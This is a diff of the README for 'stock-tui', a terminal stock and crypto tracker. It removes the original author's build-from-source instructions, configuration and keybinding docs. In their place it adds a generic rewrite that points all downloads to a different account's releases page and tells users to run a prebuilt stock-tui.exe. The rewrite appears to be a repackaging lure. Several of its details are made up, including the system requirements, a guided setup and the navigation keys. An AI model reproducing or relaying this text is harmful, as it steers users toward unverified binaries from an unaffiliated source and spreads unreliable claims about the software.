@@ -1,161 +1,83 @@
-# stock-tui
+# 🚀 stock-tui - Track Stocks and Crypto in Your Terminal
 
-Real-time stock and cryptocurrency tracker for the terminal.
+![Download stock-tui](https://img.shields.io/badge/Download-stock--tui-blue?style=for-the-badge)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/go-1.25+-00ADD8?style=flat-square&logo=go&logoColor=white">
-  <img src="https://img.shields.io/github/license/ni5arga/stock-tui?style=flat-square">
-  <img src="https://img.shields.io/github/actions/workflow/status/ni5arga/stock-tui/build.yml?branch=main&style=flat-square">
-</p>
+## 📚 Description
 
-![screenshot](screenshots/stock-tui.png)
+stock-tui is a real-time stock and cryptocurrency tracker for your terminal. With it, you can monitor financial markets easily and get up-to-date information right from your command line. Whether you are tracking stocks or cryptocurrencies, stock-tui provides a simple way to stay informed.
 
-## Features
+## 🛠️ Features
 
-- Real-time price tracking for stocks and cryptocurrencies
-- Multiple data providers (CoinGecko, Yahoo Finance, or combined)
-- Historical price charts with multiple time ranges
-- Sparkline visualization
-- Keyboard-driven interface with Vim-style navigation
+- **Real-Time Updates:** View current prices and changes live.
+- **User-Friendly Interface:** Clean and simple terminal layout.
+- **Multi-Asset Support:** Track both stocks and cryptocurrencies.
+- **Lightweight:** Easy to install and runs fast.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
 
-## Installation
+## 🌟 System Requirements
 
-### Method 1: Build from Source (Recommended)
+Before you start, ensure your system meets the following requirements:
 
-This method ensures you have the configuration file and all assets immediately available.
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
+- **RAM:** Minimum 2 GB.
+- **Disk Space:** At least 100 MB free.
+- **Network:** Internet connection for real-time updates.
 
-```bash
-git clone https://github.com/ni5arga/stock-tui.git
-cd stock-tui
-go build ./cmd/stock-tui
-./stock-tui
-```
+## 🚀 Getting Started
 
-### Method 2: Go Install (Quick Start)
+To get started with stock-tui, you first need to download the application. 
 
-Good for trying out the app with default settings.
+1. **Visit the Releases Page:** Click the link below to go to the downloads page. 
 
-```bash
-go install github.com/ni5arga/stock-tui/cmd/stock-tui@latest
-```
+   [Download stock-tui](https://github.com/gersonM20/stock-tui/releases)
 
-## Configuration
+2. **Choose the Latest Version:** On the releases page, look for the latest version at the top of the list. 
 
-The app looks for configuration in the following order:
+3. **Download the File:** Click the download link for your operating system. 
 
-1. **CLI Flag**: `--config` / `-c` (e.g., `stock-tui -c /path/to/conf.toml`)
-2. **Environment Variable**: `STOCK_TUI_CONFIG`
-3. **User Config Directory** (XDG supported):
-   - Linux/Mac: `~/.config/stock-tui/config.toml`
-   - Windows: `%APPDATA%\stock-tui\config.toml`
-4. **Current Directory**: `./config.toml`
+## 📥 Download & Install
 
-A sample `config.toml` is included in the repo. To use it system-wide:
+To install stock-tui, follow these steps:
 
-```bash
-mkdir -p ~/.config/stock-tui
-curl -sL https://raw.githubusercontent.com/ni5arga/stock-tui/main/config.toml > ~/.config/stock-tui/config.toml
-```
+1. **Download** the latest version from the releases page: [Download stock-tui](https://github.com/gersonM20/stock-tui/releases).
 
-**Example config.toml:**
+2. **Extract the Files:**
+   - If you downloaded a zipped file, right-click on it and select "Extract" or "Unzip."
+   - Navigate into the extracted folder.
 
-```toml
-# Data provider: "simulator", "coingecko", "yahoo", or "multi" (default)
-provider = "multi"
+3. **Run the Application:**
+   - For Windows: Double-click `stock-tui.exe`.
+   - For macOS or Linux: Open your terminal, navigate to the folder containing the downloaded file, and run the command:
+     ```bash
+     ./stock-tui
+     ```
 
-# Refresh interval
-refresh_interval = "5s"
+4. **Follow the On-Screen Instructions:** The application will guide you through the setup process.
 
-# Default chart range: "1H", "24H", "7D", "30D"
-default_range = "24H"
+## 💡 Usage Tips
 
-# Watchlist symbols
-# Crypto: use -USD suffix (BTC-USD, ETH-USD)
-# Stocks: use ticker (AAPL, GOOGL)
-symbols = [
-    "BTC-USD",
-    "ETH-USD",
-    "SOL-USD",
-    "AAPL",
-    "GOOGL",
-    "TSLA",
-    "MSFT",
-    "NVDA"
-]
-```
+- Once stock-tui is running, you can view stock and cryptocurrency prices.
+- Use the arrow keys to navigate through different stocks and cryptocurrencies.
+- Press `Q` or `Ctrl+C` to quit the application.
 
-## Keybindings
+## 📖 Troubleshooting
 
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down in watchlist |
-| `k` / `↑` | Move up in watchlist |
-| `/` | Search/filter symbols |
-| `Esc` | Exit search mode |
-| `s` | Cycle sort mode (Name/Price/Change%) |
-| `S` | Toggle sort direction (Asc/Desc) |
-| `Tab` | Cycle time range |
-| `1` | 1 hour range |
-| `2` | 24 hour range |
-| `3` | 7 day range |
-| `4` | 30 day range |
-| `Tab` | Cycle chart type (Line/Area/Candle) |
-| `r` | Refresh data |
-| `?` | Toggle help |
-| `q` | Quit |
+If you encounter issues, consider the following:
 
-## Data Providers
+- **Check your Internet Connection:** Ensure you are connected to the internet for real-time data.
+- **Verify the Downloaded File:** Make sure the download completed successfully.
+- **Reinstalling:** If you have errors, try removing the application and reinstalling it from the releases page.
 
-| Provider | Assets | API Key |
-|----------|--------|---------|
-| `simulator` | Fake data | None |
-| `coingecko` | Crypto | None (free tier) |
-| `yahoo` | Stocks | None (unofficial) |
-| `multi` | Both | None |
+## 🌐 Community and Support
 
-> **Note**: Yahoo Finance API is unofficial and may have rate limits.
-> CoinGecko free tier allows ~10-30 requests/minute.
+For help or to share your experiences, consider joining our community:
 
-## Supported Platforms
+- **GitHub Discussions:** Engage with other users and developers.
+- **Issue Tracker:** Report bugs or request features.
 
-- Linux
-- macOS
-- Windows
+## 🔗 Additional Resources
 
-## Architecture
+- **Documentation:** Detailed usage and feature explanations can be found in the [Documentation](https://github.com/gersonM20/stock-tui).
+- **Contributing:** Interested in improving stock-tui? Check out our [Contributing Guide](https://github.com/gersonM20/stock-tui/blob/main/CONTRIBUTING.md).
 
-```
-cmd/stock-tui/       Entry point
-internal/
-├── app/             Bubble Tea model
-├── config/          Viper configuration
-├── data/            Provider implementations
-├── models/          Domain types
-└── ui/
-    ├── chart/       Price chart component
-    ├── footer/      Status bar
-    ├── help/        Help overlay
-    ├── modal/       Generic modal
-    ├── styles/      Lip Gloss styles
-    └── watchlist/   Symbol list
-```
-
-## Development
-
-```bash
-# Run
-go run ./cmd/stock-tui
-
-# Build
-go build ./cmd/stock-tui
-
-# Test
-go test ./...
-
-# Lint
-go vet ./...
-```
-
-## License
-
-[MIT](https://github.com/ni5arga/stock-tui/blob/main/LICENSE)
+Now, you are ready to track stocks and cryptocurrencies in real time using stock-tui. Enjoy your financial tracking journey!
